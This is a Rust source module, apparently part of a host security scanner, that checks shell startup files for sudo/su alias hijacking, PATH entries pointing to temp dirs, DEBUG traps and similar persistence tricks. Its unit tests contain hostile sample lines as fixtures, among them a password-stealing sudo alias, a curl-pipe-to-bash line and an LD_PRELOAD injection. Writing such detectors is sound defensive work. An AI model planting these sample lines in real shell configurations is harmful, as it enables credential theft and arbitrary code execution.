//! Shell startup files.

use std::path::{Path, PathBuf};

use super::{finish, logical_lines, review_fix, snip};
use crate::ctx::Ctx;
use crate::finding::{Acc, Finding, Severity};
use crate::patterns;
use crate::pkg::Ownership;
use crate::util::fs::in_temp;

const NAME: &str = "shell";

const HOME_FILES: &[&str] = &[
    ".bashrc", ".bash_profile", ".bash_login", ".bash_logout", ".profile", ".zshrc", ".zprofile", ".zshenv", ".zlogin", ".zlogout",
    ".xprofile", ".xinitrc", ".xsessionrc", ".config/fish/config.fish",
];
const HOME_DIRS: &[&str] = &[".config/fish/conf.d"];
const SYSTEM_FILES: &[&str] = &[
    "/etc/profile", "/etc/bash.bashrc", "/etc/bashrc", "/etc/bash.bash_logout", "/etc/zsh/zshrc", "/etc/zsh/zprofile", "/etc/zsh/zshenv",
    "/etc/zsh/zlogin", "/etc/zshrc", "/etc/zprofile", "/etc/zshenv", "/etc/zlogin", "/etc/fish/config.fish",
];
const SYSTEM_DIRS: &[&str] = &["/etc/profile.d", "/etc/fish/conf.d"];

const HIJACK_HIGH: &[&str] = &["sudo", "su", "doas", "passwd", "pkexec"];
const HIJACK_MED: &[&str] = &["ssh", "scp", "gpg", "git", "ls", "ps", "netstat", "ss", "top", "kill"];

/// Names defined by `alias NAME=`, `NAME()`, `function NAME`, or fish `function NAME`.
fn defined_name(line: &str) -> Option<&str> {
    let ident = |s: &str| -> Option<usize> {
        let n = s.find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-')).unwrap_or(s.len());
        (n > 0).then_some(n)
    };
    if let Some(rest) = line.strip_prefix("alias ") {
        let rest = rest.trim_start().trim_start_matches("-g ").trim_start();
        let n = ident(rest)?;
        return (rest[n..].starts_with('=') || rest[n..].starts_with(' ')).then_some(&rest[..n]);
    }
    if let Some(rest) = line.strip_prefix("function ") {
        let rest = rest.trim_start();
        return ident(rest).map(|n| &rest[..n]);
    }
    let n = ident(line)?;
    line[n..].trim_start().starts_with("()").then_some(&line[..n])
}

/// PATH assignments: return problematic components.
fn path_issues(line: &str) -> Vec<(Severity, String)> {
    let mut out = Vec::new();
    let value = if let Some(i) = line.find("PATH=") {
        // Only PATH itself (not MANPATH, LD_LIBRARY_PATH...).
        let before = &line[..i];
        if before.ends_with(|c: char| c.is_ascii_alphanumeric() || c == '_') {
            return out;
        }
        line[i + 5..].trim_matches(|c| c == '"' || c == '\'').to_string()
    } else if let Some(rest) = line.strip_prefix("set -gx PATH ").or_else(|| line.strip_prefix("set -x PATH ")).or_else(|| line.strip_prefix("fish_add_path ")) {
        rest.split_whitespace().collect::<Vec<_>>().join(":")
    } else {
        return out;
    };
    let value = value.split(|c: char| c.is_whitespace() || c == ';').next().unwrap_or("").trim_matches(|c| c == '"' || c == '\'');
    let comps: Vec<&str> = value.split(':').collect();
    for (i, c) in comps.iter().enumerate() {
        let c = c.trim_matches(|ch| ch == '"' || ch == '\'');
        if in_temp(c) {
            out.push((Severity::High, format!("PATH includes a temp dir ({c})")));
        } else if c == "." || (c.is_empty() && comps.len() > 1 && (i == 0 || i == comps.len() - 1)) {
            out.push((Severity::Med, "PATH includes the current directory".to_string()));
        }
    }
    out
}

pub fn analyze_text(text: &str) -> Acc {
    let mut acc = Acc::default();
    for (ln, line) in logical_lines(text, &['#']) {
        for h in patterns::scan(&line) {
            acc.add(h.sev, format!("line {ln}: {} [{}]", h.what, snip(&line)));
        }
        if let Some(name) = defined_name(&line) {
            // `alias sudo='sudo '` (enables alias expansion) and similar self-wrappers are benign.
            let body = line.split_once('=').map(|(_, b)| b.trim_matches(|c| c == '"' || c == '\'' || c == ' ')).unwrap_or("");
            let self_wrap = line.starts_with("alias ")
                && body.split_whitespace().next().map(patterns::base) == Some(name)
                && !body.split_whitespace().next().is_some_and(|b| b.contains('/'))
                && !patterns::scan(&line).iter().any(|h| h.sev >= Severity::Med);
            if self_wrap {
                // benign
            } else if HIJACK_HIGH.contains(&name) {
                acc.add(Severity::High, format!("line {ln}: redefines `{name}` (credential capture pattern) [{}]", snip(&line)));
            } else if HIJACK_MED.contains(&name) && patterns::scan(&line).iter().any(|h| h.sev >= Severity::Med) {
                acc.add(Severity::Med, format!("line {ln}: redefines `{name}` with suspicious content"));
            }
        }
        for (s, r) in path_issues(&line) {
            acc.add(s, format!("line {ln}: {r}"));
        }
        if line.starts_with("trap ") && line.contains("DEBUG") {
            acc.add(Severity::Low, format!("line {ln}: DEBUG trap runs code before every command"));
        }
    }
    acc
}

pub fn run(ctx: &Ctx) -> Vec<Finding> {
    let mut files: Vec<(PathBuf, bool)> = SYSTEM_FILES.iter().map(|p| (PathBuf::from(p), true)).collect();
    for d in SYSTEM_DIRS {
        files.extend(ctx.list(Path::new(d)).into_iter().map(|p| (p, true)));
    }
    for h in &ctx.homes {
        files.extend(HOME_FILES.iter().map(|f| (h.path.join(f), false)));
        for d in HOME_DIRS {
            files.extend(ctx.list(&h.path.join(d)).into_iter().map(|p| (p, false)));
        }
    }
    let mut out = Vec::new();
    for (p, system) in files {
        let Some(text) = ctx.read_text(&p) else { continue };
        let owner = if system { ctx.owner(&p) } else { Ownership::Unknown };
        ctx.record_file(&Ctx::key(NAME, &p), &p, matches!(owner, Ownership::Owned(_)));
        let acc = analyze_text(&text);
        let fix = |_: &Ownership| {
            if system {
                review_fix(ctx, &p)
            } else {
                format!("Review the flagged lines and edit them out: ${{EDITOR:-nano}} {}\nThen start a new shell (do not source the file to test it).", ctx.q(&p))
            }
        };
        if let Some(f) = finish(ctx, NAME, &p, acc, &owner, system.then_some(Severity::Low), fix) {
            out.push(f);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sev(t: &str) -> Option<Severity> {
        analyze_text(t).sev
    }

    #[test]
    fn hijacks() {
        assert_eq!(defined_name("alias sudo='sudo -E'"), Some("sudo"));
        assert_eq!(defined_name("sudo() { echo; }"), Some("sudo"));
        assert_eq!(defined_name("function su"), Some("su"));
        assert_eq!(defined_name("ll() { ls -l; }"), Some("ll"));
        assert_eq!(sev("alias sudo='/tmp/.s'"), Some(Severity::High));
        assert_eq!(sev("alias ll='ls -la'"), None);
        assert_eq!(sev("alias sudo='sudo '"), None);
        assert_eq!(sev("alias sudo=\"sudo -E\""), None);
        assert_eq!(sev("alias sudo='/usr/local/bin/sudo'"), Some(Severity::High));
        assert_eq!(sev("alias sudo='read -s p; echo $p >> ~/.p; sudo'"), Some(Severity::High));
    }

    #[test]
    fn path_hijack() {
        assert_eq!(sev("export PATH=/tmp/.bin:$PATH"), Some(Severity::High));
        assert_eq!(sev("export PATH=.:$PATH"), Some(Severity::Med));
        assert_eq!(sev("PATH=\"$HOME/.local/bin:$PATH\""), None);
        assert_eq!(sev("export MANPATH=/tmp/x:$MANPATH"), Some(Severity::Med)); // only the temp-path reference
        assert_eq!(sev("fish_add_path /dev/shm/x"), Some(Severity::High));
    }

    #[test]
    fn ordinary_rc_is_clean() {
        let rc = "# ~/.bashrc\n[[ $- != *i* ]] && return\nalias ls='ls --color=auto'\nPS1='[\\u@\\h \\W]\\$ '\neval \"$(zoxide init bash)\"\nexport EDITOR=vim\n";
        assert_eq!(sev(rc), None);
        assert_eq!(sev("curl -s https://x | bash\n"), Some(Severity::High));
        assert_eq!(sev("export LD_PRELOAD=/home/u/.x.so\n"), Some(Severity::High));
    }
}
